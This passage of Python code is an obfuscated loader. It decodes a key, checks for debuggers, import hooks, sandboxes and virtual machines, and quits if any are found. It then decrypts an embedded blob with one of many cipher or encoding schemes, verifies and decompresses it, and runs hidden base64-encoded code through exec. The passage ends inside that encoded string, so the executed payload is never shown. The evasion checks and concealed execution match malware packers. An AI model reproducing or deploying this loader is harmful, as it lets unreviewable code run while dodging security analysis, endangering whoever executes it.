bytes.fromhex("56465555694b63547d73467d20577e42236b7779625778777c6b5b425a74675641575a79657a6523617b77254969285e5663557025264858757f64594823764853736b672448527f59264459476821585556654343787b612441606840595f5d78504258547c5f6955236870484244577d585c7645685858624147697e592264657e7a70755772445969477d656753417c5a58605c555544475a45694b796359434959587063562774275c5753205b6860797f53664b752075215047477b777e2223216b766b61536652465e666b665753527662765e7c464241447720505841527f5c20682227274143547a53796b78595041422861664b7a7b60782957267a5470266b467b587f722328785b27546b52295962635f5e475720295920672564567f672627492942267a4773627672454546655d6b7a565d5c5d595e744367497b5f52726b657b60627458572342615a53434176617962684276207a53654b755b505070407a5f45577f257a235561687b4267405227537255795775487d7b69697d7c617e527b405a415b74572663666469465656435b5c695320597a7264695c44735653264b61555f41555c7463466327587d642079245768455c6152675472677243492149565e502322477448605e445979466869797d687a5469215c78667c7277615969216550244766652264686452535256592829657c465e40237327727675777350276045756721422029632455287656257d7d7970435721444b6224765c65534665457b6063202855594355615679655643545f78275d5a4461225d5e757d7b487b2561477b56705f52575e5e5876487e207865766768792055572074277c53482363225858467544747274415969705b5e7447525d5a4226527d6872657f605a734b6929415c6027567948237c757e627f22265945445b7f675453796843625758535a6b4b70215e7e465553607a67554067666459705b47435040447475435f77747e7b536728217a26625977725352636253614859767753745655525028245874677b495d67586761587b425b5049625b73765a5e646022215a43275079792375414227667c607c5227785826217b607224504b25257b6767437c7d617f525d736b5b7e57784466527961694754467d777728757557276744287f60727f5b535742235a637652497a22477a695421455378616b53422174227e555e4b42467a5442434b7a25725758255625625e775752257c53627d7d6759634967757d707d24625a20444575287c7f5d425d63524378725a4970705a5e696376207a6168572461216b446241295a7364735d414124747468274b5869627a21227a436168624843467d6b45795f5e57422574772349557e7a65577e685249535d7a2478794069235b6164636b274555697c27214129265353576855775b")
    _byxuusddu = bytes(_ ^ 17 for _ in _byxuusddu).decode()
    _ndbvr.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _ndbvr.modules:
            _ndbvr.stderr.write('error: debugger detected\n'); _ndbvr.exit(1)
    _cagdnt = _asflqdhje.b64decode(_nrnsk)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_ndbvr.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _ndbvr.stderr.write('error: hook detected\n'); _ndbvr.exit(1)
    if len(_ndbvr.meta_path) > 5:
        _ndbvr.stderr.write('error: import hook detected\n'); _ndbvr.exit(1)
    if getattr(_ndbvr, 'flags', None) and _ndbvr.flags.no_user_site:
        _ndbvr.stderr.write('error: sandbox detected\n'); _ndbvr.exit(1)
    import os
    if any(x in str(_ndbvr.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _ndbvr.stderr.write('error: virtual machine detected\n'); _ndbvr.exit(1)
    if _mpacuinyx == 1:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _qwgpdg, algorithms as _sdvsxxk, modes as _jodesb
        except ImportError:
            _ndbvr.stderr.write("error: cryptography not installed\n"); _ndbvr.exit(1)
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=80)
        _lpwemtxb = _ghoeytx[:32]; _gyhlugqy = _ghoeytx[32:48]; _kvjcjplx = _ghoeytx[48:80]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _giwzf = _qwgpdg(_sdvsxxk.AES(_lpwemtxb), _jodesb.CBC(_gyhlugqy))
        _knxuarasr = _giwzf.decryptor()
        _knxuarasr = _knxuarasr.update(_qjuwdw) + _knxuarasr.finalize()
        _cnveykpv = _knxuarasr[-1]
        if _cnveykpv < 1 or _cnveykpv > 16 or not all(_ == _cnveykpv for _ in _knxuarasr[-_cnveykpv:]):
            _ndbvr.stderr.write("error: decryption failed\n"); _ndbvr.exit(1)
        _knxuarasr = _knxuarasr[:-_cnveykpv]
    elif _mpacuinyx == 3:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _alyko
        except ImportError:
            _ndbvr.stderr.write("error: cryptography not installed\n"); _ndbvr.exit(1)
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _knxuarasr = _cagdnt[16:-32]
        _qjuwdw = _knxuarasr[:-16]; _cnveykpv = _knxuarasr[-16:]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=76)
        _lpwemtxb = _ghoeytx[:32]; _gyhlugqy = _ghoeytx[32:44]; _kvjcjplx = _ghoeytx[44:76]
        _jqtjb = _fhqaf.new(_kvjcjplx, _knxuarasr, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _knxuarasr = _alyko(_lpwemtxb).decrypt(_gyhlugqy, _qjuwdw + _cnveykpv, None)
    elif _mpacuinyx == 13:
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=80)
        _lpwemtxb = _ghoeytx[:32]; _gyhlugqy = _ghoeytx[32:48]; _kvjcjplx = _ghoeytx[48:80]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        import struct as _ewqgz
        def _gmcwfn(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_ewqgz.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_ewqgz.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_ewqgz.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _jyyklyw = _ewqgz.unpack('<I',_gyhlugqy[:4])[0]
        _gyhlugqy = _gyhlugqy[4:]
        _zsrwtvwq = bytearray()
        while len(_zsrwtvwq) < len(_qjuwdw):
            _cnveykpv = _gmcwfn(_lpwemtxb, _jyyklyw, _gyhlugqy)
            for _pvgtahu in range(min(64, len(_qjuwdw) - len(_zsrwtvwq))):
                _zsrwtvwq.append(_qjuwdw[len(_zsrwtvwq)] ^ _cnveykpv[_pvgtahu])
            _jyyklyw += 1
        _knxuarasr = bytes(_zsrwtvwq)
    elif _mpacuinyx == 5:
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=64)
        _lpwemtxb = _ghoeytx[:32]; _kvjcjplx = _ghoeytx[32:64]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _knxuarasr = bytes(_qjuwdw[i] ^ _lpwemtxb[i % 32] for i in range(len(_qjuwdw)))
    elif _mpacuinyx == 9:
        def _kmygwzpdz(_vknqe):
            if _vknqe[:2] == b'<~': _vknqe = _vknqe[2:]
            if _vknqe[-2:] == b'~>': _vknqe = _vknqe[:-2]
            _gltqf = bytearray(); _gmogvgsm = 0
            while _gmogvgsm < len(_vknqe):
                if _vknqe[_gmogvgsm] == 122:
                    _gltqf.extend(b'\x00\x00\x00\x00'); _gmogvgsm += 1; continue
                _fzalxcac = 0; _lxnyorluc = 0
                while _gmogvgsm < len(_vknqe) and _lxnyorluc < 5:
                    _fzalxcac = _fzalxcac * 85 + (_vknqe[_gmogvgsm] - 33); _gmogvgsm += 1; _lxnyorluc += 1
                _mksvwid = _lxnyorluc - 1
                if _mksvwid > 0: _gltqf.extend(_fzalxcac.to_bytes(4, 'big')[4-_mksvwid:])
            return bytes(_gltqf)
        _knxuarasr = _kmygwzpdz(_cagdnt)
    elif _mpacuinyx == 2:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _qwgpdg, algorithms as _sdvsxxk, modes as _jodesb
        except ImportError:
            _ndbvr.stderr.write("error: cryptography not installed\n"); _ndbvr.exit(1)
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=80)
        _lpwemtxb = _ghoeytx[:32]; _gyhlugqy = _ghoeytx[32:48]; _kvjcjplx = _ghoeytx[48:80]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _giwzf = _qwgpdg(_sdvsxxk.AES(_lpwemtxb), _jodesb.CTR(_gyhlugqy))
        _knxuarasr = _giwzf.decryptor().update(_qjuwdw)
    elif _mpacuinyx == 0:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _qwgpdg, algorithms as _sdvsxxk, modes as _jodesb
        except ImportError:
            _ndbvr.stderr.write("error: cryptography not installed\n"); _ndbvr.exit(1)
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=64)
        _lpwemtxb = _ghoeytx[:32]; _kvjcjplx = _ghoeytx[32:64]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _giwzf = _qwgpdg(_sdvsxxk.AES(_lpwemtxb), _jodesb.ECB())
        _knxuarasr = _giwzf.decryptor()
        _knxuarasr = _knxuarasr.update(_qjuwdw) + _knxuarasr.finalize()
        _cnveykpv = _knxuarasr[-1]
        if _cnveykpv < 1 or _cnveykpv > 16 or not all(_ == _cnveykpv for _ in _knxuarasr[-_cnveykpv:]):
            _ndbvr.stderr.write("error: decryption failed\n"); _ndbvr.exit(1)
        _knxuarasr = _knxuarasr[:-_cnveykpv]
    elif _mpacuinyx == 10:
        _knxuarasr = bytes.fromhex(_cagdnt.decode('ascii'))
    elif _mpacuinyx == 11:
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=64)
        _lpwemtxb = _ghoeytx[:32]; _kvjcjplx = _ghoeytx[32:64]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _cnveykpv = _lpwemtxb[0]
        _knxuarasr = bytearray()
        for _jyyklyw in range(len(_qjuwdw)):
            _zsrwtvwq = _qjuwdw[_jyyklyw] ^ _cnveykpv
            _knxuarasr.append(_zsrwtvwq)
            _cnveykpv = _qjuwdw[_jyyklyw] ^ _lpwemtxb[ (_jyyklyw + 1) % len(_lpwemtxb) ]
            _cnveykpv = (((_cnveykpv << 3) & 0xFF) | (_cnveykpv >> 5)) ^ 0x5A
        _knxuarasr = bytes(_knxuarasr)
    elif _mpacuinyx == 8:
        _jmypdexg = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _depabbqnq = {c:i for i,c in enumerate(_jmypdexg)}
        def _tkzmw(_kijkejtsk):
            _xoidklhbn = bytearray(); _feaxctj = 0
            while _feaxctj < len(_kijkejtsk):
                _hfztpjev = 0; _xneikur = 0
                while _feaxctj < len(_kijkejtsk) and _xneikur < 5:
                    _hfztpjev = _hfztpjev * 85 + _depabbqnq[chr(_kijkejtsk[_feaxctj])]; _feaxctj += 1; _xneikur += 1
                _fcxiqkp = _xneikur - 1
                if _fcxiqkp > 0: _xoidklhbn.extend(_hfztpjev.to_bytes(4, 'big')[4-_fcxiqkp:])
            return bytes(_xoidklhbn)
        _knxuarasr = _tkzmw(_cagdnt)
    elif _mpacuinyx == 4:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher as _qwgpdg, algorithms as _sdvsxxk, modes as _jodesb
        except ImportError:
            _ndbvr.stderr.write("error: cryptography not installed\n"); _ndbvr.exit(1)
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=80)
        _lpwemtxb = _ghoeytx[:32]; _gyhlugqy = _ghoeytx[32:48]; _kvjcjplx = _ghoeytx[48:80]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _giwzf = _qwgpdg(_sdvsxxk.ChaCha20(_lpwemtxb, _gyhlugqy), mode=None)
        _knxuarasr = _giwzf.decryptor().update(_qjuwdw)
    elif _mpacuinyx == 12:
        _zsrwtvwq = _cagdnt[:16]; _fccsxzs = _cagdnt[-32:]; _qjuwdw = _cagdnt[16:-32]
        _ghoeytx = _yrlempei.pbkdf2_hmac('sha256', _byxuusddu.encode(), _zsrwtvwq, 100000, dklen=64)
        _lpwemtxb = _ghoeytx[:32]; _kvjcjplx = _ghoeytx[32:64]
        _jqtjb = _fhqaf.new(_kvjcjplx, _qjuwdw, digestmod='sha256').digest()
        if not _fhqaf.compare_digest(_fccsxzs, _jqtjb):
            _ndbvr.stderr.write("error: integrity check failed\n"); _ndbvr.exit(1)
        _cnveykpv = 3 + (_zsrwtvwq[0] & 7)
        _zsrwtvwq = bytearray(_qjuwdw)
        for _jyyklyw in range(_cnveykpv - 1, -1, -1):
            _gmcwfn = (3 + _jyyklyw) & 7
            _pvgtahu = (_jyyklyw * 0x1B + 0x5A) & 0xFF
            for _gyhlugqy in range(len(_zsrwtvwq)):
                _cnveykpv = _zsrwtvwq[_gyhlugqy]
                _cnveykpv ^= _pvgtahu
                _cnveykpv = ((_cnveykpv >> _gmcwfn) | ((_cnveykpv << (8 - _gmcwfn)) & 0xFF))
                _cnveykpv ^= _lpwemtxb[(_jyyklyw * len(_zsrwtvwq) + _gyhlugqy) % len(_lpwemtxb)]
                _zsrwtvwq[_gyhlugqy] = _cnveykpv
        _knxuarasr = bytes(_zsrwtvwq)
    elif _mpacuinyx == 7:
        _knxuarasr = _asflqdhje.b32decode(_cagdnt)
    elif _mpacuinyx == 6:
        _knxuarasr = _asflqdhje.b64decode(_cagdnt)
    else:
        _ndbvr.stderr.write("error: unsupported algorithm\n"); _ndbvr.exit(1)
    _vk = bytes.fromhex("320bc25e48e5f9c80377c352aeb52cf24e844fedd3ec5aef39a6f97ffcca317b")
    _vn = bytes.fromhex("52b926d403256405bd26d761f18284dd")
    _sig = _knxuarasr[-32:]
    _pl = _knxuarasr[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _ndbvr.stderr.write('error: VM integrity check failed\n'); _ndbvr.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _knxuarasr[1] == 1:
        import zlib as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 2:
        import lzma as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 3:
        import bz2 as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 4:
        import brotli as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 5:
        import zstandard as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 6:
        import gzip as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 7:
        import lz4.frame as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 8:
        import snappy as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 9:
        import gzip as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    elif _knxuarasr[1] == 10:
        import blosc as _vihzuzgez
        _pd = _vihzuzgez.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_asflqdhje.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcvVnNBdXV4MXhmbW95SHBES0p1NmZaMDdMUjdObGM4VEtJWStEa2t6MWRjPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnZkpseG9WS2ZraERxemVzTEJ3TGU5RS8xT2dZelJrYnJzR0ozbDJqbURtbWVFSXMxTkJrcWl4MU9ZQWN3WDNKRU41SGVkRy9pYkp5dEFoa1YzeHN6b2FPODBtaFRwNGsvNElaZVNiUHYvV0RwR2lOalFBbGRWVURmZmFNbUNxMXhhaDNxejQrYjZHTlh4K3QrUjlESVN4VlJCaWZsbUtySUgxYithc1Z1di9MOUpHbUc1K2dkSFBjajRDSkkzd1dzbzNMQks2VnBOTU5EZFlFRHQyWjgvTGRYbll0dU03WjhCYWJ0S2RFZGJZNmkycTJERE5BaEdaRTNkTHdvOWhHWUMxWDVIWVhEcmttK0U5UTNOeGxwMC9idnM1NUgrNU8vV0JLVnF1T1ptMDhrMDJJSkp3Ukl4WnVHZmczc01uZndFNUk9JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21vRHU4UzBjTWFlaW5HbU5ibHBTVnJCb0tpaVZsLzBSRWZNRHMrenZGbUhPYndHR2p1RWlYMWl3NXJFRHpnWDFBWUJZeXZOazkvdVdBL0o3MHFMeFk1RSsvVENuQ1FKTzJWc2lwd01IaHJBdmlDUFl4TTR3UFdXZmR2Um5ueFdLRHVZTXdEd0xHNmRoVFRjTnpEMXZTVFlzUk95OG1sTEV3eEt1MWMweCtzTEdKK3dWS1o2a1ZwZWNHVVpTWFNpLzM3K0pOczZMU2xueHc2VUVYOUQvcktZZndqaTE3emQ2TE5Dc0U5MWtHcWY0d0hybk1rR2VxNTV5NXZqeDNDc3JRNEpmSWVIbi9Ub1ZXSHB1RGl6TDhvT2JMOVk0eG5xUDJTbU9LYUNLckE9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdLR3ZLOWk5QXdNaVdlMjZFUFYzWURySndOUGs2WW5kVDZ6QW5qcmFPNzVrZ3JJanhRYm9WUlZpMVRCNXl4TUlsa0VETmVxQ0kvS2F3THBnazJ1L3VEY1ppOGQrdnUxa3VOUklBN2tFOUhLOS9CcmNpeXRWM05hRFBSampLejlJL0E1WXNrMVNOaThqTS9sVS9pQ2d2R1NhVTl2NDFxcUplY1JsVVBpYmFUekgzcWxSVTM5VHNia21iZUw5UitIdHE4aE5ybitJYm0yYytVRUFKRnErTlNURHpEKzB0am80MWxMVm82NGlLbzEyZy9TL0N0OUZ6THNINzRGUGZmb3NyU0RXakhIODFOVmVQS0RFdUxCMmhBS1dPUTdQaEZTaDMzNjNNN0NUZzFDK0tqRCtzOGh2RkhldDdSd2dKQThnPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCc5bmlOK0EzVGxBUGM3RGFVNUMwZDVhS2JBUERyUVZHQk9VVkx3RzErRlhwTkQ4WEJERGpvOHN3alBsRzU0L2NaL0xqTko5V2V6OFRJc2RZZDcyOUxQWC94ZHJFLzVGelZnUk5DZWtRcGVsSVhHNnBoR0NSOHpxT3Zmb2JIMlVnZm5GUm1GczRLTzNrZUZzTTJBOEIxbm5pUndjT1c0Z1RIVTJYQkwzdWtxQk5tdXdQMHZVREhFQ0MxdWg0YUo2UUVFRko4YlNGT0xLZ2VCRGpMZFVZRWVUbjBUalNPTFBQNnFzWXh2T3FYMlRtSElWMVRrUm9YcFZXVktMVlJQUk0xQW5QYjN1Nm5tSWE2bGVnUUs4TDJIeU1sTlB5MTlmQmFaWFZhTFAyelJJODA1T1VBYmY3N2Nnem1OVWdQZHo2c1ZocFZoTDNOSGNlUU82UDdWc0JLb3poVXl6QUU3WjVBcDk2aWlCK2gzakxQYTZWeTBsak9sR0s4Zm1aOEltWFdZdll0UWFCWlkvYTloRmV4UVVZWG9pUm5UOTY4Skp3amRmYlk1RzcxTW42NGwzbUlPcGtwdzhzaDhUU0gxQ1phd3JkRWUvVVJRTDFweUF1bzhhUWZRMzBZTC9xZXVvN2VYRFJiMjRpa2JZVXJkTjNiaVZ5NVNLWEdRa0l0dmxKellBMzRzMFB1MDhVakJCZnNIdWRPajZTdlU1SkxraFNWSmVNeVhxYXBlQm11eXg5SjhlVE9Cc05TVTZ6NTVsSFQ0NjVLcDAxR0c1VUduMzIxK1hCckIzNmt1SnJEZ0hYdC9JMTU4Zm53aEtMUWlKRGtDYmpycEpGNndjZFd2N1BCVlowMGg3UWxiUzU4Rk5uUklIa2hFQnQ0eG1QUGxmYkNOdjdiWE5EakRoZ2R1a2VPZVQ5RDFGWFdHdmlXYjB5Y2dXYWMwRWswM2JScDBGT2JJQkZqWTB6Qmx0cXBHeWxpZ04zMzMwN1FEb01FZ3puSjJRdGQ1UVBsT0xtb29CMzhOdHpNTDRNeE8zVHZ0L1JNenhPNzFyUnY4Z2tRcGdEY1EwQTZTam5hbXA0aVlheFNVYStiL1p2bmJHT29vODBBVGg3c3Z4NURYTk5oMGt2L3VHWXJaaXhRUkpHUkp2Sjd0aTl3QSsxclpHMU1ibXBMTkNMZXVZeXF1RXRSVUF0Vjl2U2psR0dvaVo2eGV4SkxJd3J0ZlhGSkplVk1BdlZQZk5ndFBHS3lWb2dvYlZ3VWhWRTZFWmdtWDVMMU5Gcmc3NERXWlRIdmM2bGdnc3MxVlBiQWM2SS83YXpWNEJTaGJjNDgxQjNramJCeEZxTWxjcXVDTGxWanFGUlNZNlluMW9nMVNXMmhZeG5HSjZaVTJESENOSFVvQ2c4bVdEWWlya1N3a0d0U2NxWnZMOHcrZUdDbCtnbjBWN0hmTjRiZWdJdm9xOElwa0cxbmQyN1IzK1ROTVMwR0ticzhYTlF2S0ZyQXU0Z01BanlIYzQ2a1ZkKzJuTFBVM1ZTcnJieXowYkZkcTh5L1V4QVZuWkQ4K3MzZzNxU2tmWmJqck1YRUpUNzFtK21LUFZraWNET1k2ZFVMbnRhTEdKWHYzK1U0UTR5UFhRYWlYVDZlWnY1ZnE4T3dCVmVqakErUWk2eWZuZnRjUTVqMlo1WElTZERTaVdEakVoV21UTnlnMlVPV0Uwb1NSUjRiUHFPeU5ST2xSOWptUS9wL0lNcU9IMHhlSWVKN1FybEtnMzI3RkFQdlhFMlNFa2JoQ3JZOTdDZ0xvYmVwRjYvclE5YUtxd2piTE1NVkFFUXdqdE9IcnFZNnNFdlpVMVVGc3NESFNmaVUrcm1GNXI4YVI1TytaV2xmbmhEYzFTTlVHUDFvdXM0V1hBK1l1WEpzM0w1VW5rMVpEWituLyt6TWdhYldFWVNMUGhVZ0xPQkhsUDNhVlRsdmN6VFRGcmN5RkZZV2V1NjBnM2hMUEcrTHFkQnNpMDJQd0IyZ0xOdnFxcjA5NENMM1ppdGxoOW1WMW81dFN6b3VoRlBiWXlrRkIxcEpDVHV0WUQxcjdNWFhRRm9NZGRBSlZlQk9vWGRMU3lxT2ZHRlM5ZlVSQ0lKbldSQnUvSlhVdUQ3ZkxHTzFzNktYMWE2N1FVdXYrTFFDd0FVV1VwWkdIUDNJc2JSVU5YTVhTSEIyWFZXcFlrc1hsaURrdTg1Z0xpWkt6YWxOV0J5U21Vdm1udXFtVHRUSWxsL0VjNTNqU2laSzgrNlVERWkwTFJHRUFIUzNLVkNJbURJWE9KdjRVYUIwUHZXK2I0ZlFSK0Vkei9wREFUQ05NM1YwT0RxWjlDc1lJdjZ0WGE4c0tjRWZIa0l4SkJZeTlTVDgzLzJPbVRydVFXdzZZSVN3SHpZbFJuME1lVTNBandLNG9WV29FYjVoT3dJalE3Z3FrWDU2ZVowL2craEdaVE5KVXVnbHhaU2J6R0g4MzNiaUo1S3N1UkVROTRyajhOS0N6Uzcrd3VMejZpNCtIZlNSU1daSGZHLzRIZ0R6OGEyVnFjMVNOUi9NQjdMZ0t1V1hCREZ2TVpnUXN5ZUMwVVpkYnRZR1BJRjVVNk9IWG9zT0hRNTVJNVNsYmNHelptdFdSVUJMRmhxd1F5K0hacml6NzVtRkVERUlnL3NEb3VPbmRveGFJSGFuRmlaV2FmZkNGaEZaU1NTMXZsazBVOXgzbVJ4VEh1eXlsQU0xQlBUVGVZdnE3ak40STZqb0RxVWNmZXdtLzZReTJDbzhOb3JFYndhMVJ3KzloaEJsK3oyTXVUMTVERXZhMnNvWmRxYXB1bjgzU3ErTmZRdkVnalBzeDJCVFlHTHlyTlp6c2kxWXhud0lON2dydDg4MVd4L2pRNTMzcjFGMndRN3NKeUJXZlR0S3RjWWNqTTNHSi8yT3RreDZOc2JBY0pGM1pvMTB4eEptTmxLdkFtQ21iOXBXOHZoTmZOUEgxMnk3eTRxODA0VkFvMzc3czJZQnRJVS8zSmpZY2k2czk0OEJaZFAycmt6T1hMbEV0dUE2Wklqc3VsZmY1UUlkOUNYYUlkMklEaEl5MXVIZXppdlZkYkU4RVlURC9BTzNGSlc2NGw3MkwzZkRBQ2N2WjNCZzNvUjIwcG1OWjhENU9GWURNSkhXNjN4bUh0SENJUm5iNkovUHEzbXNLTHBtL2c5TXQ1VEkycGJGRGlqc0EwTnVXSDJnZ0xwMmdiUVAyQmdOUzBuWmdSdWpNRWgxQkcxQ09aUE9YaVMxeDAvRTh2M1NQaUxKVC9YTFhVTGV3RXZzZ2JiS1RKcnlPZysxOG5tMmFGNzdEMldFMThJb2FHTHJRK2lYbGNGM0hJS09vUlFkWXVvYnd5eEZhTFRpbGdLTXA2WFdxR2c2SWFnTVhFdnFjYzBTbEtreEZKT29YajYyUE5hUG1SMkRtM0VSTkd1aitrL1NVTjZRZk1XTEpIekNEOUh5dGp3ZlgxcTc4ejdUNUhYNkxKaGpWZDJsWlBnUkUxank1RVI5c0xjQ0x1Mk11VjhTWWM4azlDdTZKLzR1NUlnVlBZaWNLV1YvSlBhVHU2QTZlcTR3RDg4TlZ3V1BJTG9TZkpXRjZ6QjZpNGt2V3NTVXhwblRkMG5Fd1FNRVYwbWN1dWhIUmlGcU9NNW1oQjVFUHhtQkcvQUNMWVh3MUl0VUhtUFlTU0hDbGVNLzErT3dKMytCUjhlN2dLUzBrV211bFhOY1AzeW9EdnVIZ1QyUUZwdGtrcktoQU5JcnZybWRTck5MemZmVnJDSWJTOWU2UUVKdHJRSlZTRER4cGtPQi9oTjB4c3NJVHpoVlZRYkRaa1RIanlnREhJSFhORU9hdERJa1lkRkNKYlZjVW5xeGRsZXAvYzg3S1RqbzVGMmtiNjkzSEVsNU13YnN0eGZ3czBWdG9CaUppN1h1c2FMRXNVQWptUjZlblhHUENNWDFTVmpKbW9WQV